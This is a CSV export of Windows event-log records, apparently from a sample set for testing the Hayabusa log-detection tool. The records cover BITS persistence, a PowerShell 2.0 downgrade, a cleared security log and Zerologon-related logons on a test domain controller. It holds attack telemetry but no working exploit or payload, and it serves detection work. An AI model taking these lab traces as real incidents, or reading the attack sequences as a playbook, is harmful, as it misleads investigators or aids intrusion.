7,17,2021-06-13 06:19:28.3511197,308,Warning,Microsoft-Windows-Bits-Client,Microsoft-Windows-Bits-Client/Operational,1140,356,sv-dc.hinokabegakure-no-sato.local,0,S-1-5-18,,,,,,,,,,,False,/evidence/windows-evtx-hayabusa-samples/Persistence/T1197_BitsClient.evtx,0x4000000000000000,0,"{""EventData"":{""Data"":{""@Name"":""number"",""#text"":""3199.234""}}}"
705,705,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
706,706,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
707,707,2021-01-28 09:58:44.5230589,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
708,708,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
709,709,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
710,710,2021-01-28 09:58:44.5387607,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=11\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
711,711,2021-01-28 09:58:44.5387607,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
712,712,2021-01-28 09:58:44.6482499,800,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Pipeline Execution Details,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=15\n\n\tUserId=DESKTOP-ST69BPO\\user01\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=1\n\tScriptName=\n\tCommandLine=, CommandInvocation(Out-Default): \""Out-Default\""\n"",""Binary"":""""}}"
713,713,2021-01-28 09:58:44.8355471,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from Available to Stopped,,,"HostApplication=powershell calc","HostName=ConsoleHost","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=17\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.18362.145\n\tHostId=64821494-0737-4ce9-ad67-3ac0e50a81b8\n\tHostApplication=powershell calc\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=74ae21ca-7fa9-40cc-a265-7a41fdb168a6\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
714,714,2021-01-28 10:22:26.3668321,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=10\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
715,715,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=12\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
716,716,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=14\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
717,717,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=16\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
718,718,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=18\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
719,719,2021-01-28 10:22:26.3826720,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=20\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
720,720,2021-01-28 10:22:26.3826720,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"HostApplication=C:\Windows\System32\sdiagnhost.exe -Embedding","HostName=Default Host","HostVersion=5.1.18362.145",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=22\n\n\tHostName=Default Host\n\tHostVersion=5.1.18362.145\n\tHostId=00e06fdc-c31b-4d3a-ab93-1324abb766a7\n\tHostApplication=C:\\Windows\\System32\\sdiagnhost.exe -Embedding\n\tEngineVersion=5.1.18362.145\n\tRunspaceId=7d995610-1656-4675-a6fd-458a9f4f8b7c\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
721,721,2021-01-28 10:40:54.8693413,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"WSMan, Started, 	ProviderName=WSMan
	NewProviderState=Started

	SequenceNumber=1

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""WSMan, Started, \tProviderName=WSMan\n\tNewProviderState=Started\n\n\tSequenceNumber=1\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
722,722,2021-01-28 10:40:54.8693413,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Alias, Started, 	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=2

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Alias, Started, \tProviderName=Alias\n\tNewProviderState=Started\n\n\tSequenceNumber=2\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
723,723,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Environment, Started, 	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Environment, Started, \tProviderName=Environment\n\tNewProviderState=Started\n\n\tSequenceNumber=3\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
724,724,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"FileSystem, Started, 	ProviderName=FileSystem
	NewProviderState=Started

	SequenceNumber=4

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""FileSystem, Started, \tProviderName=FileSystem\n\tNewProviderState=Started\n\n\tSequenceNumber=4\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
725,725,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Function, Started, 	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Function, Started, \tProviderName=Function\n\tNewProviderState=Started\n\n\tSequenceNumber=5\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
726,726,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Registry, Started, 	ProviderName=Registry
	NewProviderState=Started

	SequenceNumber=6

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Registry, Started, \tProviderName=Registry\n\tNewProviderState=Started\n\n\tSequenceNumber=6\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
727,727,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Variable, Started, 	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=7

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Variable, Started, \tProviderName=Variable\n\tNewProviderState=Started\n\n\tSequenceNumber=7\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
728,728,2021-01-28 10:40:54.8844424,600,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Provider is Started,,,"Certificate, Started, 	ProviderName=Certificate
	NewProviderState=Started

	SequenceNumber=8

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Certificate, Started, \tProviderName=Certificate\n\tNewProviderState=Started\n\n\tSequenceNumber=8\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=\n\tRunspaceId=\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
729,729,2021-01-28 10:40:54.8844424,400,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from None to Available,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=2.0
	RunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Available, None, \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=9\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=2.0\n\tRunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
730,730,2021-01-28 10:40:54.9468666,403,Info,PowerShell,Windows PowerShell,0,0,DESKTOP-ST69BPO,0,,Engine state is changed from Available to Stopped,,,"Stopped, Available, 	NewEngineState=Stopped
	PreviousEngineState=Available

	SequenceNumber=10

	HostName=ConsoleHost
	HostVersion=2.0
	HostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c
	EngineVersion=2.0
	RunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","HostName=ConsoleHost","HostVersion=2.0",,,,,False,/evidence/windows-evtx-hayabusa-samples/ImpairDefenses/T1562.010_DowngradeAttack_PowerShell.evtx,0x80000000000000,0,"{""EventData"":{""Data"":""Stopped, Available, \tNewEngineState=Stopped\n\tPreviousEngineState=Available\n\n\tSequenceNumber=10\n\n\tHostName=ConsoleHost\n\tHostVersion=2.0\n\tHostId=5cbb33bf-acf7-47cc-9242-141cd0ba9f0c\n\tEngineVersion=2.0\n\tRunspaceId=c6e94dca-0daf-418c-860a-f751a9f2cbe1\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandPath=\n\tCommandLine="",""Binary"":""""}}"
1,12136,2022-02-23 09:44:15.2144608,1102,Info,Microsoft-Windows-Eventlog,Security,300,1176,dc1.test.local,0,,Event log cleared,TEST\Administrator,,SID: (S-1-5-21-3684832485-3471852018-3987709081-500),,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,0x4020000000000000,0,"{""UserData"":{""LogFileCleared"":{""SubjectUserSid"":""S-1-5-21-3684832485-3471852018-3987709081-500"",""SubjectUserName"":""Administrator"",""SubjectDomainName"":""TEST"",""SubjectLogonId"":""0x67589""}}}"
2,12137,2022-02-23 09:44:17.7048336,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,1744,dc1.test.local,0,,Administrative logon,TEST\DC1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0x7E68CE,,,,,,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC1$""},{""@Name"":""SubjectDomainName"",""#text"":""TEST""},{""@Name"":""SubjectLogonId"",""#text"":""0x7E68CE""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
3,12138,2022-02-23 09:44:17.7049395,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,600,1744,dc1.test.local,0,,Successful logon,-\-," (fe80::7191:d555:270f:4d0b)",Target: TEST.LOCAL\DC1$,LogonType 3,LogonId: 0x7E68CE,,,,-,False,/evidence/windows-evtx-hayabusa-samples/LateralMovement/T1210_Zerologon_WindowsDefaultLogging.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC1$""},{""@Name"":""TargetDomainName"",""#text"":""TEST.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0x7E68CE""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""f24a1aa9-4919-497f-5382-c96e5878dbfc""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::7191:d555:270f:4d0b""},{""@Name"":""IpPort"",""#text"":""51241""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
